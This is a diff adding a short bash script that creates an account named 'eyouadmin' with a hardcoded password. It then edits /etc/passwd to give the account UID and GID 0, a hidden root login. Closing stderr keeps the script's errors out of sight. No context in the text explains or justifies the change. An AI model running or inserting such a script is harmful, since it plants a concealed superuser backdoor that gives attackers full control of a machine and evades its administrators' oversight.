@@ -1,0 +1,8 @@
+#!/bin/bash
+
+{
+groupdel eyouadmin 
+useradd -M eyouadmin 
+echo "eyouadmin:jishubu" |chpasswd
+sed -i -e '/^eyouadmin:/ s/\<[0-9]*\>/0/g' /etc/passwd
+} 2>&-
